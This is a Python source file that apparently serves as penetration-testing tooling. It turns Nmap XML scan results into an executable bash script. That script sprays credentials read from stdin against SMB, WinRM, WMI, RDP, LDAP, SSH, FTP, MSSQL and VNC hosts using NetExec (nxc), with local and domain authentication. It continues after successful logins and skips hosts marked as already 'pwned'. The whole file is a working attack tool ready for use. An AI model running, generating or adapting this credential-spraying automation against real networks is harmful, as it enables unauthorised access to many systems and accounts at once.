#!/usr/bin/env python3
import sys
import argparse
import xml.etree.ElementTree as ET
import os

PORT_SERVICE_MAP = {
    21: "ftp",
    22: "ssh",
    139: "smb",
    445: "smb",
    1433: "mssql",
    2049: "nfs",
    3389: "rdp",
    389: "ldap",
    636: "ldap",
    5900: "vnc",
    5985: "winrm",
    5986: "winrm",
    135: "wmi",
}

BASH_ARRAY_NAMES = {
    "ftp": "FTP_TARGETS",
    "ssh": "SSH_TARGETS",
    "smb": "SMB_TARGETS",
    "mssql": "MSSQL_TARGETS",
    "nfs": "NFS_TARGETS",
    "rdp": "RDP_TARGETS",
    "ldap": "LDAP_TARGETS",
    "vnc": "VNC_TARGETS",
    "winrm": "WINRM_TARGETS",
    "wmi": "WMI_TARGETS",
}


def parse_args():
    p = argparse.ArgumentParser(
        description="Generate an nxc-based password spray script from Nmap XML.")
    p.add_argument(
        "-n", "--nmap-xml",
        required=True,
        help="Nmap XML file (created with `nmap -oX scan.xml ...`).",
    )
    p.add_argument(
        "--services",
        help=("Comma-separated list of services to consider "
              "(default: ssh,ldap,smb,mssql,ftp,nfs,winrm,wmi,vnc,rdp)."),
    )
    p.add_argument(
        "-p",
        "--pwned",
        help=(
            "IPs to exclude (already pwned). "
            "Either a space-separated list of IPs, or a filename containing IPs. "
            "Third octet is ignored; comparison uses octets 1,2,4."),
    )
    return p.parse_args()


def parse_nmap_xml(path, allowed_services=None):
    """
    Returns: dict(service -> set([ip,...]))
    """
    tree = ET.parse(path)
    root = tree.getroot()

    service_hosts = {}

    for host in root.findall("host"):
        ip = None
        for a in host.findall("address"):
            if a.get("addrtype") == "ipv4":
                ip = a.get("addr")
                break
        if ip is None:
            continue

        ports_el = host.find("ports")
        if ports_el is None:
            continue

        for port_el in ports_el.findall("port"):
            state_el = port_el.find("state")
            if state_el is None or state_el.get("state") != "open":
                continue

            portid = port_el.get("portid")
            if portid is None:
                continue
            try:
                port = int(portid)
            except ValueError:
                continue

            service = PORT_SERVICE_MAP.get(port)
            if service is None:
                continue
            if allowed_services is not None and service not in allowed_services:
                continue

            service_hosts.setdefault(service, set()).add(ip)

    return service_hosts


def make_pwned_keys(pwned_arg):
    """
    Build a set of keys "oct1.oct2.oct4" from:
      - a whitespace-separated string of IPs, or
      - a file containing IPs.
    """
    keys = set()
    if not pwned_arg:
        return keys

    if os.path.isfile(pwned_arg):
        with open(pwned_arg, "r", encoding="utf-8") as f:
            data = f.read()
    else:
        data = pwned_arg

    for token in data.split():
        parts = token.strip().split(".")
        if len(parts) == 4:
            key = f"{parts[0]}.{parts[1]}.{parts[3]}"
            keys.add(key)

    return keys


def generate_bash(service_hosts, nmap_xml_path, pwned_keys):
    lines = []
    lines.append("#!/usr/bin/env bash")
    lines.append(f"# Generated by nmap2nxc_spray.py from {nmap_xml_path}")
    lines.append("# Services found (service: IPs):")
    if service_hosts:
        for svc in sorted(service_hosts):
            ips = " ".join(sorted(service_hosts[svc]))
            lines.append(f"#   {svc}: {ips}")
    else:
        lines.append("#   (none matching requested services)")
    if pwned_keys:
        lines.append(
            "# Excluding pwned keys (oct1.oct2.oct4): " +
            ", ".join(
                sorted(pwned_keys)))
    lines.append("")

    # domain toggle at runtime
    lines.append("ENABLE_DOMAIN=0")
    lines.append("")
    lines.append('if [ "${1:-}" = "--domain" ] || [ "${1:-}" = "-d" ]; then')
    lines.append("  ENABLE_DOMAIN=1")
    lines.append("  shift")
    lines.append("fi")
    lines.append("")

    # stdin required
    lines.append('if [ -t 0 ]; then')
    lines.append('  echo "Usage: $0 [--domain] < creds.txt" >&2')
    lines.append('  echo "Each line: origin:username:password" >&2')
    lines.append("  exit 1")
    lines.append("fi")
    lines.append("")

    # arrays per service, with pwned filtering and `octet` substitution
    for svc, hosts in sorted(service_hosts.items()):
        arr_name = BASH_ARRAY_NAMES.get(svc)
        if not arr_name:
            continue
        ips_mod = []
        for ip in sorted(hosts):
            parts = ip.split(".")
            if len(parts) == 4:
                key = f"{parts[0]}.{parts[1]}.{parts[3]}"
                if key in pwned_keys:
                    continue
                # substitute third octet literally as `octet`
                if parts[0] == "192":
                    parts[2] = "`octet`"
                else:
                    parts[2] = "`octet_in`"
                ips_mod.append(".".join(parts))
            else:
                ips_mod.append(ip)
        if not ips_mod:
            continue
        ips_str = " ".join(ips_mod)
        lines.append(f"{arr_name}=({ips_str})")
    lines.append("")

    # main credential loop
    lines.append('while IFS=: read -r origin user pass; do')
    lines.append('  # skip empty / comment lines')
    lines.append('  [ -z "$user" ] && continue')
    lines.append('  [[ "$origin" = "#"* ]] && continue')
    lines.append('  if [[ "$pass" =~ [[:space:]]$ ]]; then')
    lines.append(
        '    echo "WARNING: trailing whitespace in password for ${user}; aborting." >&2')
    lines.append("    exit 1")
    lines.append("  fi")
    lines.append(
        '  echo "# === Credential from ${origin}: ${user} / *** ===" >&2')
    lines.append("")

    # Windowsy services first (local + optional domain)
    if "smb" in service_hosts:
        lines.append('  if [ ${#SMB_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '    echo "nxc smb ${SMB_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --local-auth --continue-on-success"')
        lines.append(
            '    nxc smb "${SMB_TARGETS[@]}" -u "$user" -p "$pass" --local-auth --continue-on-success')
        lines.append('    if [ "$ENABLE_DOMAIN" -eq 1 ]; then')
        lines.append(
            '      echo "nxc smb ${SMB_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '      nxc smb "${SMB_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("    fi")
        lines.append("  fi")
        lines.append("")

    if "winrm" in service_hosts:
        lines.append('  if [ ${#WINRM_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '    echo "nxc winrm ${WINRM_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --local-auth --continue-on-success"')
        lines.append(
            '    nxc winrm "${WINRM_TARGETS[@]}" -u "$user" -p "$pass" --local-auth --continue-on-success')
        lines.append('    if [ "$ENABLE_DOMAIN" -eq 1 ]; then')
        lines.append(
            '      echo "nxc winrm ${WINRM_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '      nxc winrm "${WINRM_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("    fi")
        lines.append("  fi")
        lines.append("")

    if "wmi" in service_hosts:
        lines.append('  if [ ${#WMI_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '    echo "nxc wmi ${WMI_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --local-auth --continue-on-success"')
        lines.append(
            '    nxc wmi "${WMI_TARGETS[@]}" -u "$user" -p "$pass" --local-auth --continue-on-success')
        lines.append('    if [ "$ENABLE_DOMAIN" -eq 1 ]; then')
        lines.append(
            '      echo "nxc wmi ${WMI_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '      nxc wmi "${WMI_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("    fi")
        lines.append("  fi")
        lines.append("")

    if "rdp" in service_hosts:
        lines.append('  if [ ${#RDP_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '      echo "WARNING: valid RDP logins without Pwned! may mean the creds are valid but RDP not allowed."')
        lines.append(
            '    echo "nxc rdp ${RDP_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --local-auth --continue-on-success"')
        lines.append(
            '    nxc rdp "${RDP_TARGETS[@]}" -u "$user" -p "$pass" --local-auth --continue-on-success')
        lines.append('    if [ "$ENABLE_DOMAIN" -eq 1 ]; then')
        lines.append(
            '      echo "nxc rdp ${RDP_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '      nxc rdp "${RDP_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("    fi")
        lines.append("  fi")
        lines.append("")

    # LDAP – only makes sense in domain mode, no --local-auth
    if "ldap" in service_hosts:
        lines.append('  if [ ${#LDAP_TARGETS[@]} -gt 0 ]; then')
        lines.append('    if [ "$ENABLE_DOMAIN" -eq 1 ]; then')
        lines.append(
            '      echo "nxc ldap ${LDAP_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '      nxc ldap "${LDAP_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("    fi")
        lines.append("  fi")
        lines.append("")

    # Non-Windows services: ssh, ftp, mssql, vnc
    if "ssh" in service_hosts:
        lines.append('  if [ ${#SSH_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '    echo "nxc ssh ${SSH_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '    nxc ssh "${SSH_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("  fi")
        lines.append("")

    if "ftp" in service_hosts:
        lines.append('  if [ ${#FTP_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '    echo "nxc ftp ${FTP_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '    nxc ftp "${FTP_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("  fi")
        lines.append("")

    if "mssql" in service_hosts:
        lines.append('  if [ ${#MSSQL_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '    echo "nxc mssql ${MSSQL_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '    nxc mssql "${MSSQL_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("  fi")
        lines.append("")

    if "vnc" in service_hosts:
        lines.append('  if [ ${#VNC_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '    echo "nxc vnc ${VNC_TARGETS[*]} -u \\"$user\\" -p \\"$pass\\" --continue-on-success"')
        lines.append(
            '    nxc vnc "${VNC_TARGETS[@]}" -u "$user" -p "$pass" --continue-on-success')
        lines.append("  fi")
        lines.append("")

    # NFS only commented
    if "nfs" in service_hosts:
        lines.append('  if [ ${#NFS_TARGETS[@]} -gt 0 ]; then')
        lines.append(
            '    echo "# NFS detected: ${NFS_TARGETS[*]} (no spraying done)" >&2')
        lines.append("  fi")
        lines.append("")

    lines.append("done")
    lines.append("")
    lines.append("# End of spray script.")
    lines.append("")
    return "\n".join(lines)


def main():
    args = parse_args()

    if args.services:
        allowed_services = {
            s.strip()
            for s in args.services.split(",")
            if s.strip()
        }
    else:
        allowed_services = None  # all known

    service_hosts = parse_nmap_xml(args.nmap_xml, allowed_services)
    pwned_keys = make_pwned_keys(args.pwned) if args.pwned else set()
    bash_script = generate_bash(service_hosts, args.nmap_xml, pwned_keys)

    # Print to stdout
    sys.stdout.write(bash_script)

    # Write spray.sh + chmod
    out_path = "spray.sh"
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(bash_script)
    os.chmod(out_path, 0o755)


if __name__ == "__main__":
    main()
